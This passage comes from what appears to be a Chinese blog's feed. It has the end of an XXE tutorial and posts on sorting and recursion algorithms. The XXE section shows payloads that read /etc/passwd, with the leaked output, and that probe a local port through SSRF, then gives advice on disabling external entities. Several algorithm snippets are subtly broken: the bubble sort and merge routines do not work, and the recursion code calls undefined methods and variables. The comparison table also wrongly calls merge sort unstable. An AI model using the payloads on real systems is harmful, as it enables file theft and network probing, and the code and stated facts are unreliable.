class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">&quot;test101&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">date</span>&gt;</span>2018-10-01<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上述代码将交由服务器的XML处理器解析。代码被解释并返回：{“Request Successful”: “Added!”}</p><p>我们尝试编辑恶意的payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">GVI</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">&quot;test101&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">category</span>&gt;</span>Computers<span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure><p>代码被解释并返回：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;error&quot;</span>: <span class="string">&quot;no results for description root:x:0:0:root:/root:/bin/bash</span></span><br><span class="line"><span class="string">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span></span><br><span class="line"><span class="string">bin:x:2:2:bin:/bin:/bin/sh</span></span><br><span class="line"><span class="string">sys:x:3:3:sys:/dev:/bin/sh</span></span><br><span class="line"><span class="string">sync:x:4:65534:sync:/bin:/bin/sync...</span></span><br></pre></td></tr></table></figure><p>这样，我们就变相的读取了/etc/passwd文件</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>我们也可以使用http URI并强制服务器向我们指定的端点和端口发送GET请求，将XXE转换为SSRF。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">GVI</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1:8080&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">&quot;test101&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">category</span>&gt;</span>Computers<span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">date</span>&gt;</span>2018-10-01<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure><p>尝试与端口8080通信，根据响应时间/长度，攻击者将可以判断该端口是否已被开启。</p><p>xxe常见场景是如pdf在线解析、word在线解析、定制协议，留言板等，跟逻辑设计有关而与语言无关，最好是不要让XML作为参数传输或整体结构可被用户篡改。如果一定要使用，至少要禁用DTD、Entity。</p><p>xxe危害 读取本地文件，执行系统命令，探测内网端口，攻击内网服务 探测内网端口的协议有gopher file dict，不同语言支持不同的协议，是具体情况而定 file http ftp是常用的。</p><p><strong>XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;XXE漏洞&quot;&gt;&lt;a href=&quot;#XXE漏洞&quot; class=&quot;headerlink&quot; title=&quot;XXE漏洞&quot;&gt;&lt;/a&gt;XXE漏洞&lt;/h2&gt;&lt;p&gt;XXE漏洞全称XML External Entity Injection，即XML外部实体注入漏洞，是在对不安全的外</summary>
      
    
    
    
    
    <category term="web安全" scheme="http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>常用算法-排序</title>
    <link href="http://yejuns.github.io/2021/03/31/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F/"/>
    <id>http://yejuns.github.io/2021/03/31/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F/</id>
    <published>2021-03-31T08:01:51.000Z</published>
    <updated>2021-09-02T07:19:42.622Z</updated>
    
    <content type="html"><![CDATA[<h2 id="排序算法比较"><a href="#排序算法比较" class="headerlink" title="排序算法比较"></a>排序算法比较</h2><table><thead><tr><th align="center">排序方法</th><th align="left">时间复杂度</th><th align="center">空间复杂度</th><th align="left">稳定性</th></tr></thead><tbody><tr><td align="center">插入排序</td><td align="left">O(n^2)</td><td align="center">O(1)</td><td align="left">稳定</td></tr><tr><td align="center">冒泡排序</td><td align="left">O(n^2)</td><td align="center">O(1)</td><td align="left">稳定</td></tr><tr><td align="center">选择排序</td><td align="left">O(n^2)</td><td align="center">O(1)</td><td align="left">不稳定</td></tr><tr><td align="center">归并排序</td><td align="left">O(nlog2n)</td><td align="center">O(nlog2n)</td><td align="left">不稳定</td></tr><tr><td align="center">快速排序</td><td align="left">O(nlog2n)</td><td align="center">O(n)</td><td align="left">不稳定</td></tr><tr><td align="center">堆排序</td><td align="left">O(nlog2n)</td><td align="center">O(1)</td><td align="left">不稳定</td></tr></tbody></table><ul><li>稳定：如果 a 原本在 b 前面，而a=b，排序之后 a 仍然在 b 的前面。</li></ul><h3 id="插入排序（Insertion-Sort）"><a href="#插入排序（Insertion-Sort）" class="headerlink" title="插入排序（Insertion Sort）"></a>插入排序（Insertion Sort）</h3><p>从前到后构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到位置并插入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>, j, current; i &lt; nums.length; i++) &#123;</span><br><span class="line">        current = nums[i];  <span class="comment">//监视哨的作用</span></span><br><span class="line">        <span class="keyword">for</span> (j = i - <span class="number">1</span>; j &gt;= <span class="number">0</span> &amp;&amp; nums[j] &gt; current; j--) &#123;</span><br><span class="line">            nums[j + <span class="number">1</span>] = nums[j];</span><br><span class="line">        &#125;</span><br><span class="line">        nums[j + <span class="number">1</span>] = current;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="选择排序（Selection-sort）"><a href="#选择排序（Selection-sort）" class="headerlink" title="选择排序（Selection sort）"></a>选择排序（Selection sort）</h3><p>每次选择最小值，然后放到待排序数组的开始位置。</p><p>选择排序是给每个位置选择当前元素最小的，比如给第一个位置选择最小的，在剩余元素里面给第二个元素选择第二小的，依次类推，直到第n-1个元素，第n个元素不用选择了，因为只剩下它一个最大的元素了。那么，在一趟选择中，如果当前元素比一个元素大，而该小的元素又出现在一个和当前元素相等的元素后面，那么交换后稳定性就被破坏了。举个例子，序列5 8 5 2 9，我们知道第一遍选择第1个元素5会和2交换，那么原序列中2个5的相对前后顺序就被破坏了，所以选择排序不是一个稳定的排序算法。</p><h3 id="冒泡排序-（Bubble-Sort）"><a href="#冒泡排序-（Bubble-Sort）" class="headerlink" title="冒泡排序 （Bubble Sort）"></a>冒泡排序 （Bubble Sort）</h3><p>嵌套循环，每次查看相邻的元素，如果逆序，则交换</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> hasChange = <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">// hasChange的作用是判断某次循环是否开始，方便提前结束循环</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num.length-<span class="number">1</span>;i++)&#123;</span><br><span class="line">        hasChange = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;num.length-<span class="number">1</span>-i;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(num[j]&gt;num[j+<span class="number">1</span>])&#123;</span><br><span class="line">                swap(num[j],num[j+<span class="number">1</span>]); </span><br><span class="line">            &#125;</span><br><span class="line">            hasChange = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="归并排序（Merge-Sort）"><a href="#归并排序（Merge-Sort）" class="headerlink" title="归并排序（Merge Sort）"></a>归并排序（Merge Sort）</h3><p>使用的分治的思想。把序列递归地分成短序列，然后把各个有序的段序列合并成一个有序的长序列，不断合并直到原序列全部排好序</p><ol><li>把长度为n的输入序列分成长度为n/2的子序列</li><li>对这两个子序列分别进行归并排序</li><li>将两个排序好的子序列合并成一个最终的排序序列<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] A, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(hi &lt;= lo) <span class="keyword">return</span> ;</span><br><span class="line">        <span class="keyword">int</span> mid = (lo + hi) &gt;&gt; <span class="number">1</span>; <span class="comment">// (lo + hi) / 2  位运算速度会更快</span></span><br><span class="line">        sort(A, lo, mid);</span><br><span class="line">        sort(A, mid + <span class="number">1</span>, hi);</span><br><span class="line">        merge(A, lo, mid, hi);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里 merge 的操作就是把两个有序的数组合并成一个有序的数组</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] arr,<span class="keyword">int</span> lo,<span class="keyword">int</span> mid,<span class="keyword">int</span> hi)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] temp = Arrays.copyOf(arr,arr.length);</span><br><span class="line">        <span class="keyword">int</span> i = lo, j = mid + <span class="number">1</span>, k = lo;</span><br><span class="line">        <span class="keyword">while</span> (i&lt;mid &amp;&amp; j&lt;hi)&#123;</span><br><span class="line">            arr[k++] = temp[i]&gt;temp[j]?temp[i++]:temp[j++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= mid) arr[k++] = temp[i++];</span><br><span class="line">        <span class="keyword">while</span> (j &lt;= hi)  arr[k++] = temp[j++];</span><br><span class="line"></span><br><span class="line"><span class="comment">//        for(int p = 0;p&lt;temp.length;p++)&#123;</span></span><br><span class="line"><span class="comment">//            arr[p] = temp[p];</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="快速排序（Quick-sort）"><a href="#快速排序（Quick-sort）" class="headerlink" title="快速排序（Quick sort）"></a>快速排序（Quick sort）</h3>数组随机取一个标杆pivot，将小于pivot的元素放在pivot左边，大于pivot的元素放在pivot右边，然后依次对左边和右边的子数组继续快排。以达到整个序列有序<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (lo &gt;= hi) <span class="keyword">return</span>; <span class="comment">//如果只剩下最后一个元素，就直接返回</span></span><br><span class="line">    <span class="keyword">int</span> p = partition(nums, lo, hi);  <span class="comment">//通过partition函数，使得p左边的值都比p要小，右边的都比p大</span></span><br><span class="line">    sort(nums, lo, p - <span class="number">1</span>);</span><br><span class="line">    sort(nums, p + <span class="number">1</span>, hi);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">partition</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//随机选出一个数字，并和 hi 互换 --&gt; 此时选出进行比较的值就在 hi 处</span></span><br><span class="line">    swap(nums, randRange(lo, hi), hi);</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = lo, j = lo; j &lt; hi; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[j] &lt;= nums[hi]) &#123;</span><br><span class="line">            swap(nums, i++, j); <span class="comment">//注意这里是先交换，然后 ++ </span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    swap(nums, i, j); <span class="comment">//把基准值放在i的位置，这样 i 后面的值都比i要大</span></span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="拓扑排序-（Topological-sort）"><a href="#拓扑排序-（Topological-sort）" class="headerlink" title="拓扑排序 （Topological sort）"></a>拓扑排序 （Topological sort）</h3><p>前提：1、必须是有向图；2、图里面没有环</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Queue&lt;Integer&gt; q = <span class="keyword">new</span> LinkedList();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> v = <span class="number">0</span>; v &lt; V; v++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (indegree[v] == <span class="number">0</span>) q.add(v);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (!q.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">int</span> v = q.poll();</span><br><span class="line">            print(v);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> u = <span class="number">0</span>; u &lt; adj[v].length; u++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (--indegree[u] == <span class="number">0</span>) &#123;</span><br><span class="line">                    q.add(u);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="堆排序-（Heap-sort）"><a href="#堆排序-（Heap-sort）" class="headerlink" title="堆排序 （Heap sort）"></a>堆排序 （Heap sort）</h3><p>堆排序（Heapsort）是指利用堆这种数据结构所设计的一种排序算法。堆积是一个近似完全二叉树的结构，并同时满足堆积的性质：即子结点的键值或索引总是小于（或者大于）它的父节点。</p><p>参考资料：</p><blockquote><p><a href="https://www.cnblogs.com/onepixel/p/7674659.html">https://www.cnblogs.com/onepixel/p/7674659.html</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;排序算法比较&quot;&gt;&lt;a href=&quot;#排序算法比较&quot; class=&quot;headerlink&quot; title=&quot;排序算法比较&quot;&gt;&lt;/a&gt;排序算法比较&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;排序方法&lt;/th&gt;
&lt;th ali</summary>
      
    
    
    
    
    <category term="算法" scheme="http://yejuns.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>常用算法-递归</title>
    <link href="http://yejuns.github.io/2021/03/31/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E9%80%92%E5%BD%92/"/>
    <id>http://yejuns.github.io/2021/03/31/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E9%80%92%E5%BD%92/</id>
    <published>2021-03-31T08:01:51.000Z</published>
    <updated>2021-07-08T01:50:59.690Z</updated>
    
    <content type="html"><![CDATA[<p>递归算法是一种调⽤⾃自身函数的算法</p><h3 id="算法模板"><a href="#算法模板" class="headerlink" title="算法模板"></a>算法模板</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">fn</span><span class="params">(n)</span></span>&#123;</span><br><span class="line">    <span class="comment">//第一步：判断状态和条件是否合法</span></span><br><span class="line">    <span class="keyword">if</span>(n is invalid)&#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//第二步：判断递归是否应该结束</span></span><br><span class="line">    <span class="keyword">if</span>(match condition)&#123;</span><br><span class="line">        <span class="keyword">return</span> some operation;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//第三步：缩小问题规模</span></span><br><span class="line">    result1 = fn(n1);</span><br><span class="line">    result2 = fn(n2);</span><br><span class="line">    <span class="comment">//第四步：整合结果</span></span><br><span class="line">    <span class="keyword">return</span> combine(result1+result2); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="实例一"><a href="#实例一" class="headerlink" title="实例一"></a>实例一</h3><p>一条包含字母 A-Z 的消息通过以下方式进行编码</p><blockquote><p>‘A’ -&gt; 1</p><p>‘B’ -&gt; 2</p><p>….</p><p>‘Z’ -&gt; 26</p></blockquote><p>给定一个只包含数字的非空字符串，计算解码方式的总数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">numDecode</span><span class="params">(String s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>[] chars = s.toCharArray(s);</span><br><span class="line">    <span class="keyword">return</span> decode(chars,chars.length()-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">decode</span><span class="params">(<span class="keyword">char</span>[] chars,<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(index &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> cur = chars[index];</span><br><span class="line">    <span class="keyword">char</span> pre = chars[index-<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(cur &gt; <span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">        count = decode(chars,index-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pre &lt; <span class="string">&#x27;2&#x27;</span> || (pre == <span class="string">&#x27;2&#x27;</span> &amp;&amp; cur &lt; <span class="string">&#x27;6&#x27;</span>))&#123;</span><br><span class="line">        count +=decode(chars,index-<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="实例二"><a href="#实例二" class="headerlink" title="实例二"></a>实例二</h3><p>中心对称数是指一个数字经过180度旋转后看起来仍然相同的数字，比如“8，11，69”。</p><p>找出所有长度为n的中心对称数</p><p>比如：输入 2 ；输出 11，69，88，96</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 输入的n，m相同</span></span><br><span class="line"><span class="function">List&lt;String&gt; <span class="title">cal</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;<span class="number">0</span>||m&lt;<span class="number">0</span>||n&gt;m)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;invalid input&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">new</span> ArrayList&lt;String&gt;(Arrays.asList(<span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> <span class="keyword">new</span> ArrayList&lt;String&gt;(Arrays.aslist(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;8&quot;</span>));</span><br><span class="line"></span><br><span class="line">    List&lt;String&gt; list = cal(n-<span class="number">2</span>,m);</span><br><span class="line"></span><br><span class="line">    list&lt;String&gt; result = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;list.size();i++)&#123;</span><br><span class="line">        String s = list.get(i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(n!=m) result.add(<span class="string">&quot;0&quot;</span>+s+<span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line">        result.add(<span class="string">&quot;1&quot;</span>+s+<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        result.add(<span class="string">&quot;9&quot;</span>+s+<span class="string">&quot;6&quot;</span>);</span><br><span class="line">        result.add(<span class="string">&quot;9&quot;</span>+s+<span class="string">&quot;6&quot;</span>);</span><br><span class="line">        result.add(<span class="string">&quot;8&quot;</span>+s+<span class="string">&quot;8&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="递归的优缺点"><a href="#递归的优缺点" class="headerlink" title="递归的优缺点"></a>递归的优缺点</h3><p>缺点：需要较多次数的函数调用，如果调用层数比较深，需要增加额外的堆栈处理(还有可能出现堆栈溢出的情况)，比如参数传递需要压栈等操作，会对执行效率有一定影响</p><p>优点：代码简洁、清晰</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;递归算法是一种调⽤⾃自身函数的算法&lt;/p&gt;
&lt;h3 id=&quot;算法模板&quot;&gt;&lt;a href=&quot;#算法模板&quot; class=&quot;headerlink&quot; title=&quot;算法模板&quot;&gt;&lt;/a&gt;算法模板&lt;/h3&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;t</summary>
      
    
    
    
    
    <category term="算法" scheme="http://yejuns.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>常用算法-回朔</title>
    <link href="http://yejuns.github.io/2021/03/30/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E5%9B%9E%E6%9C%94/"/>
    <id>http://yejuns.github.io/2021/03/30/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E5%9B%9E%E6%9C%94/</id>
    <published>2021-03-30T08:01:51.000Z</published>
    <updated>2021-07-09T12:10:06.310Z</updated>
    
